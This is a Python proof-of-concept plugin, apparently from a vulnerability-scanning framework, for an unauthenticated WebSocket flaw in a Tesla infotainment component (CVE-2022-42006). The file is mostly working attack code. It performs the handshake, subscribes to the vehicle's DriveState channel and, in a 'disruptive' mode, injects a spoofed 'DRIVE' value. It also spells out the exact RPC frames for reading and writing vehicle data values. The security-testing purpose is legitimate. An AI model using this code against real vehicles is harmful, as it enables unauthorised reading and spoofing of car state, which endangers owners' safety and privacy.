#!/usr/bin/env python3
"""CVE-2022-42006 – Tesla prototype_server data-value access via unauthenticated WebSocket.

Public PoC source: https://github.com/AnalyticETH/tesla-security-research
Technique (04-LOG-BACKSHELL-AND-DV-ACCESS.md / 03-PROTOSERVER-DV-ACCESS.md):
  prototype_server listens on port 8082 (WebSocket) with no authentication.
  Any local or remote caller can subscribe to internal data-value channels
  (e.g. DriveState, BatteryLevel, GPS) and inject arbitrary DataValues.

Safety gate: is_disruptive=False
    meta_destructive_level = "Safe" for read-only subscription; True for injection.
  Plugin subscribes to one low-impact channel to confirm exposure, then
  disconnects.  Injection requires allow_disruptive=true.
"""
from __future__ import annotations

import json
import socket
import struct
import time

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 3,
    "cve": "CVE-2022-42006",
    "year": 2022,
    "domain": "network",
    "vendor_product": "Tesla Model 3/Y infotainment MCU",
    "component": "prototype_server WebSocket RPC",
    "type": "Missing authentication – data-value read/write",
    "summary": (
        "prototype_server exposes an unauthenticated WebSocket RPC on port 8082. "
        "A caller can enumerate and subscribe to all internal data-value channels, "
        "and can write arbitrary values back – e.g. spoofing DriveState, GPS position, "
        "or charging status without any credential."
    ),
    "source_url": "https://github.com/AnalyticETH/tesla-security-research",
    "requires_manual_review": False,
    "affected": [{"vendor": "Tesla", "product": "Tesla Model 3/Y MCU", "versions": [{"version": "<2021.32.10", "status": "affected"}]}],
    # Actual RPC frames observed by AnalyticETH:
    #   Subscribe:  {"type":"subscribe","namespace":"DataValue","name":"Vehicle.DriveState"}
    #   SetValue:   {"type":"set","namespace":"DataValue","name":"<channel>","value":<val>}
}

PROTOSERVER_PORT = 8082
SUBSCRIBE_MSG = json.dumps({
    "type": "subscribe",
    "namespace": "DataValue",
    "name": "Vehicle.DriveState",
}).encode()
INJECT_MSG_TEMPLATE = {
    "type": "set",
    "namespace": "DataValue",
    "name": "Vehicle.DriveState",
    "value": "DRIVE",
}


def _ws_handshake(sock: socket.socket, host: str) -> bool:
    """Perform a minimal HTTP/1.1 WebSocket upgrade."""
    key = "dGhlIHNhbXBsZSBub25jZQ=="
    req = (
        f"GET / HTTP/1.1\r\nHost: {host}:{PROTOSERVER_PORT}\r\n"
        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
    ).encode()
    sock.sendall(req)
    resp = b""
    deadline = time.time() + 5
    while time.time() < deadline:
        chunk = sock.recv(4096)
        if not chunk:
            break
        resp += chunk
        if b"\r\n\r\n" in resp:
            break
    return b"101 Switching Protocols" in resp


def _send_ws_text(sock: socket.socket, msg: bytes) -> None:
    length = len(msg)
    if length < 126:
        header = struct.pack("BB", 0x81, 0x80 | length)
    else:
        header = struct.pack("!BBH", 0x81, 0xFE, length)
    mask = b"\x00\x00\x00\x00"
    sock.sendall(header + mask + msg)


def _recv_ws_frame(sock: socket.socket, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    try:
        hdr = sock.recv(2)
        if len(hdr) < 2:
            return b""
        payload_len = hdr[1] & 0x7F
        if payload_len == 126:
            payload_len = struct.unpack("!H", sock.recv(2))[0]
        return sock.recv(payload_len)
    except Exception:
        return b""


def _run_poc(plugin):
    target = (plugin.params or {}).get("target_ip", "192.168.90.100")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {"cve": "CVE-2022-42006", "target": target, "exposed": False}

    try:
        with socket.create_connection((target, PROTOSERVER_PORT), timeout=5) as sock:
            if not _ws_handshake(sock, target):
                evidence["detail"] = "WebSocket upgrade failed (server may have changed)."
                return {"vulnerable": False, "evidence": evidence}

            # Subscribe to DriveState – read-only, non-disruptive
            _send_ws_text(sock, SUBSCRIBE_MSG)
            frame = _recv_ws_frame(sock)
            evidence["subscribe_response"] = frame.decode(errors="replace")[:300]
            evidence["exposed"] = True

            if allow_disruptive:
                inject = json.dumps(INJECT_MSG_TEMPLATE).encode()
                _send_ws_text(sock, inject)
                ack = _recv_ws_frame(sock)
                evidence["inject_response"] = ack.decode(errors="replace")[:300]
                evidence["injection_attempted"] = True
    except ConnectionRefusedError:
        evidence["detail"] = f"Port {PROTOSERVER_PORT} not open on {target}."
    except socket.timeout:
        evidence["detail"] = f"Timeout connecting to {target}:{PROTOSERVER_PORT}."
    except Exception as exc:
        evidence["detail"] = str(exc)

    return {
        "vulnerable": evidence["exposed"],
        "evidence": evidence,
        "requires_manual_review": False,
        "poc_source": "AnalyticETH/tesla-security-research / 03-PROTOSERVER-DV-ACCESS.md",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc69CVE202242006PrototypeServerUnauthWsAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-NET-069"
    meta_poc_name   = 'CVE-2022-42006 Tesla Prototype Server Unauthenticated WebSocket Active Validation'
    meta_cve_id     = "CVE-2022-42006"
    meta_severity   = "High"
    meta_protocol   = "ws"
    meta_target_os  = ["linux"]
    meta_required_params = ["target_ip"]
    meta_profiles   = ["network"]
    meta_source_url = "https://github.com/AnalyticETH/tesla-security-research"
    meta_references       = ['https://github.com/AnalyticETH/tesla-security-research']
    meta_attack_surface = "Tesla MCU unauthenticated WebSocket RPC on prototype_server:8082"
    is_disruptive   = False

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_ip"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "69_Tesla_Model_3_Y_infotainment_MCU_Tesla_Audit") if "VULN" in dir() else "69_Tesla_Model_3_Y_infotainment_MCU_Tesla_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc69CVE202242006PrototypeServerUnauthWsAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
